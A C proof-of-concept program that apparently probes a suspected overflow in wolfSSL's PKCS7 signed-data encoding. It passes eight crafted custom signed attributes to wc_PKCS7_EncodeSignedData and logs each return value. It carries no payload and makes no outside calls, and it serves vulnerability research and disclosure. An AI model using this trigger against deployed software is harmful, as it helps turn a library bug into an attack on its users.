#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <wolfssl/options.h>
#include <wolfssl/wolfcrypt/pkcs7.h>
#include <wolfssl/wolfcrypt/asn_public.h>
#include <wolfssl/wolfcrypt/error-crypt.h>

static int read_file(const char* path, unsigned char** out, unsigned int* outSz)
{
    FILE* f;
    long sz;
    unsigned char* buf;

    if (path == NULL || out == NULL || outSz == NULL)
        return -1;

    f = fopen(path, "rb");
    if (f == NULL) {
        fprintf(stderr, "[-] fopen failed: %s\n", path);
        return -1;
    }

    if (fseek(f, 0, SEEK_END) != 0) {
        fclose(f);
        return -1;
    }

    sz = ftell(f);
    if (sz <= 0) {
        fclose(f);
        return -1;
    }

    rewind(f);

    buf = (unsigned char*)malloc((size_t)sz);
    if (buf == NULL) {
        fclose(f);
        return -1;
    }

    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz) {
        free(buf);
        fclose(f);
        return -1;
    }

    fclose(f);

    *out = buf;
    *outSz = (unsigned int)sz;
    return 0;
}

int main(int argc, char** argv)
{
    const char* cert_path;
    const char* key_path;

    unsigned char* cert = NULL;
    unsigned char* key = NULL;
    unsigned int certSz = 0;
    unsigned int keySz = 0;

    wc_PKCS7 pkcs7;
    unsigned char output[65536];

    static unsigned char data[] = "wolfSSL PKCS7 signed attributes overflow probe";

    /*
     * OID body bytes, not including ASN.1 OBJECT IDENTIFIER tag/length.
     * These are simple private-ish test OIDs under 1.2.3.x.
     */
    static unsigned char oid1[] = { 0x2A, 0x03, 0x01 };
    static unsigned char oid2[] = { 0x2A, 0x03, 0x02 };
    static unsigned char oid3[] = { 0x2A, 0x03, 0x03 };
    static unsigned char oid4[] = { 0x2A, 0x03, 0x04 };
    static unsigned char oid5[] = { 0x2A, 0x03, 0x05 };
    static unsigned char oid6[] = { 0x2A, 0x03, 0x06 };
    static unsigned char oid7[] = { 0x2A, 0x03, 0x07 };
    static unsigned char oid8[] = { 0x2A, 0x03, 0x08 };

    static unsigned char v1[] = { 0x13, 0x01, '1' };
    static unsigned char v2[] = { 0x13, 0x01, '2' };
    static unsigned char v3[] = { 0x13, 0x01, '3' };
    static unsigned char v4[] = { 0x13, 0x01, '4' };
    static unsigned char v5[] = { 0x13, 0x01, '5' };
    static unsigned char v6[] = { 0x13, 0x01, '6' };
    static unsigned char v7[] = { 0x13, 0x01, '7' };
    static unsigned char v8[] = { 0x13, 0x01, '8' };

    PKCS7Attrib attrs[8];

    int ret;
    int outSz;

    if (argc != 3) {
        fprintf(stderr, "usage: %s <cert.der> <key.der>\n", argv[0]);
        return 2;
    }

    cert_path = argv[1];
    key_path = argv[2];

    fprintf(stderr, "[*] cert: %s\n", cert_path);
    fprintf(stderr, "[*] key : %s\n", key_path);

    if (read_file(cert_path, &cert, &certSz) != 0)
        return 3;
    if (read_file(key_path, &key, &keySz) != 0)
        return 4;

    fprintf(stderr, "[*] certSz: %u\n", certSz);
    fprintf(stderr, "[*] keySz : %u\n", keySz);

    memset(&attrs, 0, sizeof(attrs));
    attrs[0].oid = oid1; attrs[0].oidSz = sizeof(oid1); attrs[0].value = v1; attrs[0].valueSz = sizeof(v1);
    attrs[1].oid = oid2; attrs[1].oidSz = sizeof(oid2); attrs[1].value = v2; attrs[1].valueSz = sizeof(v2);
    attrs[2].oid = oid3; attrs[2].oidSz = sizeof(oid3); attrs[2].value = v3; attrs[2].valueSz = sizeof(v3);
    attrs[3].oid = oid4; attrs[3].oidSz = sizeof(oid4); attrs[3].value = v4; attrs[3].valueSz = sizeof(v4);
    attrs[4].oid = oid5; attrs[4].oidSz = sizeof(oid5); attrs[4].value = v5; attrs[4].valueSz = sizeof(v5);
    attrs[5].oid = oid6; attrs[5].oidSz = sizeof(oid6); attrs[5].value = v6; attrs[5].valueSz = sizeof(v6);
    attrs[6].oid = oid7; attrs[6].oidSz = sizeof(oid7); attrs[6].value = v7; attrs[6].valueSz = sizeof(v7);
    attrs[7].oid = oid8; attrs[7].oidSz = sizeof(oid8); attrs[7].value = v8; attrs[7].valueSz = sizeof(v8);

    memset(&pkcs7, 0, sizeof(pkcs7));
    memset(output, 0, sizeof(output));

    ret = wc_PKCS7_Init(&pkcs7, NULL, 0);
    fprintf(stderr, "[*] wc_PKCS7_Init returned: %d\n", ret);
    if (ret != 0)
        goto cleanup;

    ret = wc_PKCS7_InitWithCert(&pkcs7, cert, certSz);
    fprintf(stderr, "[*] wc_PKCS7_InitWithCert returned: %d\n", ret);
    if (ret != 0)
        goto cleanup;

    pkcs7.content = data;
    pkcs7.contentSz = (word32)sizeof(data);
    pkcs7.privateKey = key;
    pkcs7.privateKeySz = keySz;
    pkcs7.publicKeyOID = ECDSAk;
    pkcs7.hashOID = SHA256h;

    pkcs7.signedAttribs = attrs;
    pkcs7.signedAttribsSz = (word32)(sizeof(attrs) / sizeof(attrs[0]));

    fprintf(stderr, "[*] custom signed attributes: %u\n",
            (unsigned)pkcs7.signedAttribsSz);
    fprintf(stderr, "[*] calling wc_PKCS7_EncodeSignedData\n");

    outSz = wc_PKCS7_EncodeSignedData(&pkcs7, output, (word32)sizeof(output));

    fprintf(stderr, "[*] wc_PKCS7_EncodeSignedData returned: %d\n", outSz);

cleanup:
    wc_PKCS7_Free(&pkcs7);
    free(cert);
    free(key);

    return ret == 0 ? 0 : 1;
}
